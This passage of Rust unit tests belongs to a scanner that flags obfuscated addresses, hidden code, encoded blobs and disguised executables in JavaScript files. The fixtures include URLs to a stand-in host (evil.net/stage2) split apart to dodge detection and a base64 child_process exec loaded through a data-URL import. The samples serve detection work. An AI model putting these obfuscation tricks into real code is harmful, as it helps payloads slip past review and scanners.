                listed(&scan_text("a.js", &text), Kind::HidesConnection),
                [URL_TEXT],
                "{text}"
            );
        }
    }

    #[test]
    fn finds_addresses_cut_into_pieces() {
        for text in [
            "x = 'ht' + 'tps://evil.net/stage2'",
            "x = \"http\" + \"s://evil.net/stage2\"",
            "x = ['h','t','t','p','s','://','evil.net','/stage2'].join('')",
            "$x = 'https://' . 'evil.net/stage2';",
            "x = 'https://' 'evil.net/stage2'",
        ] {
            assert_eq!(
                listed(&scan_text("a.js", text), Kind::HidesConnection),
                [URL_TEXT],
                "{text}"
            );
        }
    }

    #[test]
    fn lists_of_protocols_are_not_a_hidden_address() {
        for text in [
            "['http', 'https', 'ws', 'wss']",
            "['http://', 'https://', 'ftp://']",
            "x = 'https://' + host + '/path'",
            "x = 'http' + (s ? 's' : '') + '://' + h",
        ] {
            let report = scan_text("a.js", text);

            assert!(listed(&report, Kind::HidesConnection).is_empty(), "{text}");
        }
    }

    #[test]
    fn media_in_data_links_is_left_alone() {
        let image = encode(&[b"\x89PNG\r\n\x1a\n".as_slice(), &[7; 3000]].concat());
        let svg = encode(b"<svg xmlns=\"http://evil.net/x\">eval(1)</svg>");

        for text in [
            format!("a {{ background: url(data:image/png;base64,{image}) }}"),
            format!("a = 'data:image/svg+xml;base64,{svg}'"),
            format!("//# sourceMappingURL=data:application/json;charset=utf-8;base64,{svg}"),
            format!("a = 'data:font/woff2;base64,{svg}'"),
        ] {
            let report = scan_text("a.js", &text);

            assert!(listed(&report, Kind::HiddenAddress).is_empty(), "{text}");
            assert!(listed(&report, Kind::HiddenCode).is_empty(), "{text}");
            assert!(listed(&report, Kind::EncodedBlob).is_empty(), "{text}");
        }
    }

    #[test]
    fn a_script_in_a_data_link_is_looked_at() {
        let script = encode(b"require('child_process').exec('id')");
        let text = format!("import('data:text/javascript;base64,{script}')");

        assert_eq!(listed(&scan_text("a.js", &text), Kind::HiddenCode).len(), 1);
    }

    #[test]
    fn addresses_in_login_tokens_and_schemas_are_not_called_hidden_on_purpose() {
        let token = encode(br#"{"iss":"https://login.acme.net/","sub":"1"}"#);
        let schema = encode(b"see http://www.w3.org/2000/svg for this");
        let text = format!("atob(x); a = '{token}'; b = '{schema}';");
        let report = scan_text("a.js", &text);

        assert!(listed(&report, Kind::HidesConnection).is_empty());
        assert_eq!(
            listed(&report, Kind::HiddenAddress),
            ["https://login.acme.net/"]
        );
    }

    #[test]
    fn hashes_identifiers_and_paths_are_ignored() {
        for text in [
            "sha = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'",
            "someVeryLongCamelCaseFunctionNameThatGoesOnAndOn()",
            "src/components/Header/index/styles/main",
            "integrity sha512-Oo+0REFV59/rz3gfJNKQiBlwfHaSESl1pcGyABQsnnIfWOFt6JNj5gCog2U6MLEP",
        ] {
            let report = scan_text("a.js", text);

            assert!(listed(&report, Kind::HiddenCode).is_empty(), "{text}");
            assert!(listed(&report, Kind::HiddenAddress).is_empty(), "{text}");
            assert!(listed(&report, Kind::EncodedBlob).is_empty(), "{text}");
        }
    }

    #[test]
    fn long_blocks_of_unreadable_data_are_listed_once_per_file() {
        let blob: Vec<u8> = (0..MIN_BLOB_CHARS).map(|n| (n * 7 % 251) as u8).collect();
        let token = encode(&blob);
        let report = scan_text("a.js", &format!("a='{token}';b='{token}';"));

        assert_eq!(listed(&report, Kind::EncodedBlob).len(), 1);
    }

    #[test]
    fn a_program_encoded_in_a_file_is_disguised() {
        let mut program = b"\x7fELF\x02\x01\x01\0".to_vec();
        program.extend((0..MIN_BLOB_CHARS).map(|n| (n * 13 % 251) as u8));
        let report = scan_text("a.js", &format!("a='{}';", encode(&program)));

        assert_eq!(listed(&report, Kind::DisguisedFile).len(), 1);
    }

    #[test]
    fn documentation_and_lockfiles_are_not_searched() {
        let text = format!("x {}", encode(b"require('child_process')"));

        for path in ["README.md", "package-lock.json", "app.js.map", "key.pem"] {
            let report = scan_text(path, &text);

            assert!(listed(&report, Kind::HiddenCode).is_empty(), "{path}");
        }
    }

    #[test]
    fn hostile_bytes_do_not_panic() {
        for text in [
            r"\x",
            r"\u",
            r"\u{",
            r"\u{}",
            r"\u{110000}\u{110000}\u{110000}\u{110000}",
            r"\777\777\777\777",
            r"\x\x\x\x\x",
            "999,999,999,999,999,999,999,999",
            "0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff",
            "chr(999)+chr(999)+chr(999)+chr(999)",
            "'h'+'",
            "'https://'+'",
        ] {
            scan_text("a.js", text);
        }
    }
}
